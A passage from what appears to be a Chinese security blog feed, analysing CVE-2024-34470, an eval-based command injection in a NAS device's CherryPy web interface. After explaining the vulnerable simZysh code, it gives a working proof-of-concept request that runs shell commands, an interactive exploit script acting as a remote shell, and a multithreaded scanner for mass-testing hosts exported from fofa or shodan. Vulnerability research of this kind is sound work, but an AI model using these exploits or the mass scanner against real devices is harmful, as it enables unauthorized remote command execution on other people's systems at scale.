(代码省略)<br>fi<br></code></pre></td></tr></table></figure></li><li><p><strong>启动 Zypkg 控制器：</strong> 脚本使用 <code>zypkg_controller.sh</code> 脚本启动 Zypkg 控制器，该控制器负责管理系统软件包。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">start package httpd early because of the fixed ports</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">prepare zypkg</span><br>/etc/init.d/zypkg_controller.sh prepare_env<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">start-up zypkgs</span><br>if [ &quot;$?&quot; = &quot;0&quot; ]; then<br>    /etc/init.d/zypkg_controller.sh start<br>fi<br></code></pre></td></tr></table></figure></li><li><p><strong>启动其他服务：</strong> 脚本还会启动其他服务，例如 SMB 服务、NMB 服务、AFP 服务、Cron 服务等等。</p></li></ol><h5 id="WSGI服务"><a href="#WSGI服务" class="headerlink" title="WSGI服务"></a><strong>WSGI服务</strong></h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">WSGI (Web Server Gateway <span class="hljs-keyword">Interface</span>) 是一种Python 规范，定义了 Web 服务器和 Web 应用程序之间通信的标准接口。它允许 Web 服务器将 HTTP 请求传递给 Web 应用程序，并接收应用程序生成的 HTTP 响应。<br></code></pre></td></tr></table></figure><h5 id="CherryPy"><a href="#CherryPy" class="headerlink" title="CherryPy"></a><strong>CherryPy</strong></h5><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">CherryPy</span> 是一个 Python Web 框架，它实现了 WSGI 规范。<br></code></pre></td></tr></table></figure><h5 id="CherryPy-如何与-WSGI-协作："><a href="#CherryPy-如何与-WSGI-协作：" class="headerlink" title="CherryPy 如何与 WSGI 协作："></a><strong>CherryPy 如何与 WSGI 协作：</strong></h5><ul><li>CherryPy 提供了一个 WSGI 应用程序对象，它接收 HTTP 请求并返回 HTTP 响应。</li><li>CherryPy 还提供了一个内置的 WSGI 服务器，可以用来运行 CherryPy 应用程序。</li></ul><p>根据cve的描述，漏洞点在ext-root文件系统中main_wsgi.pyc，ext-root文件系统大小为125.2MB</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240912211706457.png" alt="image-20240912211706457"></p><p>main_wsgi.pyc文件需要用到uncompyle6来反编译，并且文件系统里面也有很多pyc文件</p><p>使用了如下命令，将该目录下所有pyc文件反编译并将反编译后得到的py放回原目录下方便查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.pyc&#x27;</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> pyc_file; <span class="hljs-keyword">do</span> uncompyle6 -o <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$pyc_file</span>&quot;</span>)</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pyc_file</span>&quot;</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913140330946.png" alt="image-20240913140330946"></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>poc</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(&quot;subprocess&quot;).check_output(&quot;ps&quot;,+shell=True)%23</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-gml">Host: <span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span>.<span class="hljs-variable language_">x</span></span><br><span class="language-gml"></span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913140928345.png" alt="image-20240913140928345"></p><p>查看main_wsgi.py文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python">..........<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">tjp6jp6y4</span>(<span class="hljs-params">self, *url_args, **request_args</span>):<br>        <span class="hljs-keyword">if</span> url_args[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;register_main&#x27;</span> <span class="hljs-keyword">and</span> url_args[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;setCookie&#x27;</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_args.has_key(<span class="hljs-string">&#x27;location&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> request_args.has_key(<span class="hljs-string">&#x27;cookie&#x27;</span>):<br>                <span class="hljs-keyword">return</span><br>            cherrypy.response.status = <span class="hljs-number">302</span><br>            cherrypy.response.headers[<span class="hljs-string">&#x27;location&#x27;</span>] = request_args[<span class="hljs-string">&#x27;location&#x27;</span>]<br>            cherrypy.response.headers[<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>] = request_args[<span class="hljs-string">&#x27;cookie&#x27;</span>]<br>        <span class="hljs-keyword">else</span>:<br>            url = tools_cherrypy.SOCKET_URL_PREFIX + <span class="hljs-string">&#x27;/tjp6jp6y4_to_wsgi_server/%s/%s&#x27;</span> % (url_args[<span class="hljs-number">0</span>], url_args[<span class="hljs-number">1</span>])<br>            response = tools_cherrypy.socket_request(url, data=request_args, cookies=<span class="hljs-variable language_">self</span>.set_cookies())<br>            <span class="hljs-keyword">if</span> response == tools_cherrypy.INT_SERV_ERROR:<br>                <span class="hljs-keyword">return</span> response<br>            <span class="hljs-keyword">return</span> response.content<br>        <span class="hljs-keyword">return</span><br><br>    tjp6jp6y4.exposed = <span class="hljs-literal">True</span><br>    tjp6jp6y4._cp_config = &#123;<span class="hljs-string">&#x27;tools.jsonify.on&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">simZysh</span>(<span class="hljs-params">self, *url_args, **request_args</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;Simulate zyshcgi&#x27;s output. GUI&#x27;s broker shall set command as the following format:</span><br><span class="hljs-string">                        &#x27;controller_name action_name &#123;&quot;arg1&quot;: value, &quot;arg2&quot;: value, ...&#125;&#x27;</span><br><span class="hljs-string">                &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_args:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_str_format(i, <span class="hljs-string">&#x27;url&#x27;</span>):<br>                <span class="hljs-keyword">return</span> tools_cherrypy.ARG_ERROR<br> <br>        <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> request_args.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_str_format(key, <span class="hljs-string">&#x27;request&#x27;</span>):<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_list(key):<br>                    <span class="hljs-keyword">return</span> tools_cherrypy.ARG_ERROR<br>                <br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_str_format(value, <span class="hljs-string">&#x27;request&#x27;</span>):<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_list(value):<br>                    <span class="hljs-keyword">return</span> tools_cherrypy.ARG_ERROR<br> <br>        r_value = &#123;&#125;<br>        c_index = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            c_key = <span class="hljs-string">&#x27;c%d&#x27;</span> % c_index<br>            <span class="hljs-keyword">if</span> request_args.has_key(c_key):<br>                controller_n, action_n, args = request_args[c_key].split(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    controller = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;controllers.%s&#x27;</span> % controller_n)<br>                    tmp_result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;controller.%s.%s(cherrypy=%s, arguments=%s)&#x27;</span> % (<br>                     controller_n, action_n, <span class="hljs-string">&#x27;cherrypy&#x27;</span>, args))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> tmp_result:<br>                        <span class="hljs-keyword">raise</span> ValueError<br>                    r_type = <span class="hljs-built_in">type</span>(tmp_result)<br>                    <span class="hljs-keyword">if</span> r_type == <span class="hljs-built_in">list</span>:<br>                        r_value[<span class="hljs-string">&#x27;zyshdata%d&#x27;</span> % c_index] = tmp_result<br>                    <span class="hljs-keyword">else</span>:<br>                        r_value[<span class="hljs-string">&#x27;zyshdata%d&#x27;</span> % c_index] = [<br>                         tmp_result]<br>                    r_value[<span class="hljs-string">&#x27;errno%d&#x27;</span> % c_index] = <span class="hljs-number">0</span><br>                    r_value[<span class="hljs-string">&#x27;errmsg%d&#x27;</span> % c_index] = _(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    r_value[<span class="hljs-string">&#x27;zyshdata%d&#x27;</span> % c_index] = []<br>                    r_value[<span class="hljs-string">&#x27;errno%d&#x27;</span> % c_index] = -<span class="hljs-number">99999</span><br>                    r_value[<span class="hljs-string">&#x27;errmsg%d&#x27;</span> % c_index] = _(<span class="hljs-string">&#x27;Execute Error&#x27;</span>)<br> <br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">break</span><br>            c_index += <span class="hljs-number">1</span><br> <br>        <span class="hljs-keyword">return</span> r_value<br> <br>    simZysh.exposed = <span class="hljs-literal">True</span><br>......<br></code></pre></td></tr></table></figure><p>这段代码是一个使用 CherryPy 框架构建的 Python Web 应用的入口点。</p><h5 id="CherryPy-路由机制"><a href="#CherryPy-路由机制" class="headerlink" title="CherryPy 路由机制"></a>CherryPy 路由机制</h5><p>CherryPy 的路由机制依赖于 URL 中的路径来映射到应用程序中的方法。<code>simZysh</code> 方法通过 <code>exposed = True</code> 公开，因此可以通过特定的 URL 来访问它。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">simZysh.exposed = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>这意味着 <code>simZysh</code> 是公开的，并可以通过 HTTP 请求直接访问。</p><p>通过访问 <code>/cmd/simZysh/register_main/setCookie</code> 来直接调用该 Python 文件中的 <code>simZysh</code> 函数</p><h5 id="访问路径分析"><a href="#访问路径分析" class="headerlink" title="访问路径分析"></a>访问路径分析</h5><p>访问url时会调用 <code>simZysh</code> 方法，并传递路径中的部分作为参数。假设 <code>simZysh</code> 方法位于 <code>mainApplication</code> 类中，URL <code>/cmd/simZysh/register_main/setCookie</code> 的访问将会调用如下的映射逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">mainApplication</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-comment"># 其他方法...</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">simZysh</span>(<span class="hljs-params">self, *url_args, **request_args</span>):<br>        <span class="hljs-comment"># 处理逻辑...</span><br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>url_args</code></strong>: 这里的 <code>register_main</code> 和 <code>setCookie</code> 将作为位置参数传递给 <code>simZysh</code> 的 <code>url_args</code>。</li><li><strong><code>request_args</code></strong>: 任何附带的请求参数（例如，POST 或 GET 参数）都会作为 <code>request_args</code> 传递。</li></ul><h6 id="register-main的调用"><a href="#register-main的调用" class="headerlink" title="register_main的调用"></a>register_main的调用</h6><p><code>register_main</code> 和 <code>setCookie</code> 会作为路径中的一部分传递给 <code>simZysh</code> 方法，这些路径会被捕获为 <code>url_args</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">url_args = (<span class="hljs-string">&#x27;register_main&#x27;</span>, <span class="hljs-string">&#x27;setCookie&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>处理请求参数</strong>：<code>simZysh </code>函数的逻辑是从 <code>request_args</code>（请求参数）中取出控制器名称、动作名称和参数。<code>register_main</code> 是控制器名称，<code>setCookie</code> 是动作名称。</p><p><strong>动态调用控制器</strong>：<code>simZysh</code> 中使用了 Python 的 <code>__import__</code> 和 <code>eval()</code> 函数来动态导入并调用控制器中的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">controller = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;controllers.%s&#x27;</span> % controller_n)<br>tmp_result = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;controller.%s.%s(cherrypy=%s, arguments=%s)&#x27;</span> % (<br>    controller_n, action_n, <span class="hljs-string">&#x27;cherrypy&#x27;</span>, args))<br></code></pre></td></tr></table></figure><p> <code>register_main</code> 代表了一个控制器名，CherryPy 会尝试从 <code>controllers</code> 目录下导入名为 <code>register_main</code> 的控制器模块。随后，它会在 <code>register_main.pyc</code>中调用 <code>setCookie</code> 方法。</p><p>register_main.py文件</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913143000301.png" alt="image-20240913143000301"></p><h5 id="参数c0分析"><a href="#参数c0分析" class="headerlink" title="参数c0分析"></a>参数c0分析</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c0=storage_ext_cgi+CGIGetExtStoInfo+<span class="hljs-literal">None</span>)+<span class="hljs-keyword">and</span>+<span class="hljs-literal">False</span>+<span class="hljs-keyword">or</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>,+shell=<span class="hljs-literal">True</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>这里<code>c0</code> 是因为代码中 <code>c%d</code> 为 eval() 函数提供数据，每次调用时数字会递增。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">.......<br>        c_index = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            c_key = <span class="hljs-string">&#x27;c%d&#x27;</span> % c_index<br>........<br>            c_index += <span class="hljs-number">1</span><br>.......<br></code></pre></td></tr></table></figure><p>simZysh函数会循环遍历 <code>request_args</code> 字典中的键值对，并使用 <code>c_index</code> 变量来记录当前遍历到的参数索引。每次循环中，它会构造一个键名 <code>c_key</code>，例如 <code>c0</code>、<code>c1</code> 等等，并检查 <code>request_args</code> 字典中是否包含该键。</p><p>simZysh 函数会使用 <code>eval</code> 函数来执行 <code>controller_n</code> 模块中的 <code>action_n</code> 函数。</p><p>那么 <code>c0</code> 值会被解析成 <code>controller_n</code>、<code>action_n</code> 和 <code>args</code> 三个部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">controller_n: storage_ext_cgi<br>action_n: CGIGetExtStoInfo<br>args: <span class="hljs-literal">None</span>)+<span class="hljs-keyword">and</span>+<span class="hljs-literal">False</span>+<span class="hljs-keyword">or</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>, shell=<span class="hljs-literal">True</span>)%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>这里的args做了一个python的闭合拼接，通过构造一个特殊的请求参数，绕过了对用户输入的验证，导致了命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-literal">None</span>)+<span class="hljs-keyword">and</span>+<span class="hljs-literal">False</span> 的结果为 <span class="hljs-literal">False</span><br><span class="hljs-literal">False</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>, shell=<span class="hljs-literal">True</span>) 的结果为 <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;subprocess&quot;</span>).check_output(<span class="hljs-string">&quot;ps&quot;</span>, shell=<span class="hljs-literal">True</span>)，<br>因为 <span class="hljs-literal">False</span> 在布尔运算中被视为 <span class="hljs-number">0</span>，而该段python代码的结果是一个非零值。<br>因此该段代码会执行系统命令 ps，并返回命令的输出结果。<br></code></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">requests</span><br><span class="hljs-variable">import</span> <span class="hljs-variable">json</span><br><br><span class="hljs-variable">ip_address</span> = <span class="hljs-function"><span class="hljs-title">input</span>(<span class="hljs-string">&quot;pls input ip(ctrl+c to exit):&quot;</span>)</span><br><span class="hljs-variable"><span class="hljs-keyword">while</span></span> <span class="hljs-variable"><span class="hljs-literal">True</span></span>:<br>    <span class="hljs-variable">command</span> = <span class="hljs-function"><span class="hljs-title">input</span>(<span class="hljs-string">&quot;$ &quot;</span>)</span><br>    <span class="hljs-variable">url</span> = <span class="hljs-variable">f</span><span class="hljs-string">&quot;http://&#123;ip_address&#125;/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+and+False+or+__import__(\&quot;</span><span class="hljs-variable">subprocess</span>\<span class="hljs-string">&quot;).check_output(\&quot;</span>&#123;<span class="hljs-variable">command</span>&#125;\<span class="hljs-string">&quot;,+shell=True)%23&quot;</span><br>    <span class="hljs-variable">response</span> = <span class="hljs-variable">requests.get</span>(<span class="hljs-variable">url</span>)<br>    <span class="hljs-variable">data</span> = <span class="hljs-variable">json.loads</span>(<span class="hljs-variable">response.text</span>)<br>    <span class="hljs-variable">zyshdata</span> = <span class="hljs-variable">data</span>[<span class="hljs-string">&#x27;zyshdata0&#x27;</span>]<br>    <span class="hljs-variable">for</span> <span class="hljs-variable">item</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-variable">zyshdata</span>:<br>        <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">item</span>)</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240913150219048.png" alt="image-20240913150219048"></p><h4 id="漏洞批量验证"><a href="#漏洞批量验证" class="headerlink" title="漏洞批量验证"></a>漏洞批量验证</h4><p>通过fofa、shodan等工具导出url list，使用多线程的方式，并行地测试多个目标主机，通过检查响应内容是否包含特定的字符串来判断主机是否存在漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> queue<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> RequestException<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> urllib3<br><br><span class="hljs-comment"># 忽略SSL警告</span><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br><span class="hljs-comment"># 定义payload</span><br>paths_to_check = <span class="hljs-string">&quot;/cmd,/simZysh/register_main/setCookie?c0=storage_ext_cgi+CGIGetExtStoInfo+None)+&quot;</span>+<span class="hljs-string">&quot;and+False+or+__import__(\&quot;subprocess\&quot;).check_output(\&quot;id\&quot;,+shell=True)%23&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url, verify=<span class="hljs-literal">False</span>,timeout=<span class="hljs-number">2</span>) <br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 测试单个url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_host</span>(<span class="hljs-params">url</span>):<br>    fullurl = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span><span class="hljs-subst">&#123;paths_to_check&#125;</span>&quot;</span><br>    body = make_request(fullurl)<br>    <span class="hljs-keyword">if</span> body <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;nobody&#x27;</span> <span class="hljs-keyword">in</span> body:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;vulnerable&#x27;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(body)<br><br><span class="hljs-comment"># 多线程调用的Worker函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker</span>(<span class="hljs-params">queue</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> queue.empty():<br>        url = queue.get()<br>        test_host(url)<br>        queue.task_done()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;CVE-2024-34470&#x27;</span>)<br>    group = parser.add_mutually_exclusive_group(required=<span class="hljs-literal">True</span>)<br>    group.add_argument(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target URL&#x27;</span>)<br>    group.add_argument(<span class="hljs-string">&#x27;-f&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File containing list of URLs&#x27;</span>)<br><br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.url:<br>        test_host(args.url)<br>    <span class="hljs-keyword">elif</span> args.file:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(args.file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            urls = [line.strip() <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f <span class="hljs-keyword">if</span> line.strip()]<br>            <br>        url_queue = queue.Queue()<br>        <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>            url_queue.put(url)<br><br>        threads = []<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            t = threading.Thread(target=worker, args=(url_queue,))<br>            t.start()<br>            threads.append(t)<br><br>        <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>            t.join()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>示例</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240918113537308.png" alt="image-20240918113537308"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>mqtt协议学习及漏洞复现</title>
    <link href="/2024/08/16/mqtt%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/08/16/mqtt%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
